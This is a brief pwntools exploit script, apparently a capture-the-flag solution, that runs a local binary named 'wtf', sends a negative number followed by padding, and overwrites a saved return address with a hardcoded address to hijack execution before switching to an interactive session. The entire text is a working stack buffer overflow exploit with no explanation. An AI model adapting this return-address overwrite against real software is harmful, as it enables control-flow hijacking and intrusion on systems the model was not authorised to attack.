from pwn import *
p = process('./wtf')
payload  = ''
payload += '-233\n'
payload += 'a' * 0x30
payload += 'b' * 8
payload += p64( 0x4005f4 )
payload += '\n'
raw_input("...")
p.sendline(payload)
p.interactive()
